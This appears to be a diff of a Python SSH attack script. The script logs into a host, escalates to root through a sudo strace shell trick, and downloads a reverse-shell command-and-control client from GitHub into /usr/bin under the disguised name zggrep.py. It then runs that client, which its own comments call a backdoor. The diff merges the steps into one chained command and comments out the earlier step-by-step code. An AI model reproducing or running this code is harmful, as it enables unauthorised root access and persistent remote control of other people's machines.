@@ -43,52 +43,63 @@ try:
     # Connect to the server
     client.connect(hostname, port=port, username=username, password=password)
     
-    # Execute root escalation
-    stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p")
-    # Read and print the output
-    print("Output of root escalation:")
+    commands = ["sudo /bin/strace -o /dev/null /bin/bash -p", "cd ../../usr/bin",
+                "curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py", 
+                "python3 zggrep.py"]
+    full_command = " && ".join(commands)
+    
+    stdin, stdout, stderr = client.exec_command(full_command)
     print(stdout.read().decode())
+    print(stderr.read().decode())
+
     
-    errors = stderr.read().decode()
-    if errors:
-        print("Errors:")
-        print(errors)
+    # # Execute root escalation
+    # stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p")
+    # # Read and print the output
+    # print("Output of root escalation:")
+    # print(stdout.read().decode())
+    
+    # errors = stderr.read().decode()
+    # if errors:
+    #     print("Errors:")
+    #     print(errors)
+
         
     
-    # move to directory where we will install backdoor
-    stdin, stdout, stderr = client.exec_command("cd ../../usr/bin")
-    # Read and print the output
-    print("Output dir change to /usr/bin:")
-    print(stdout.read().decode())
+    # # move to directory where we will install backdoor
+    # stdin, stdout, stderr = client.exec_command("cd ../../usr/bin")
+    # # Read and print the output
+    # print("Output dir change to /usr/bin:")
+    # print(stdout.read().decode())
     
-    errors = stderr.read().decode()
-    if errors:
-        print("Errors:")
-        print(errors)
+    # errors = stderr.read().decode()
+    # if errors:
+    #     print("Errors:")
+    #     print(errors)
         
         
-    # download backdoor onto host
-    stdin, stdout, stderr = client.exec_command("curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py")
-    # Read and print the output
-    print("Output, downloading backdoor onto host:")
-    print(stdout.read().decode())
+    # # download backdoor onto host
+    # stdin, stdout, stderr = client.exec_command("curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py")
+    # # Read and print the output
+    # print("Output, downloading backdoor onto host:")
+    # print(stdout.read().decode())
     
-    errors = stderr.read().decode()
-    if errors:
-        print("Errors:")
-        print(errors)
+    # errors = stderr.read().decode()
+    # if errors:
+    #     print("Errors:")
+    #     print(errors)
         
         
-    # execute payload
-    stdin, stdout, stderr = client.exec_command("python3 zggrep.py")
-    # Read and print the output
-    print("Output, executing payload onto host:")
-    print(stdout.read().decode())
+    # # execute payload
+    # stdin, stdout, stderr = client.exec_command("python3 zggrep.py")
+    # # Read and print the output
+    # print("Output, executing payload onto host:")
+    # print(stdout.read().decode())
     
-    errors = stderr.read().decode()
-    if errors:
-        print("Errors:")
-        print(errors)
+    # errors = stderr.read().decode()
+    # if errors:
+    #     print("Errors:")
+    #     print(errors)
     
 finally:
     # close the connection
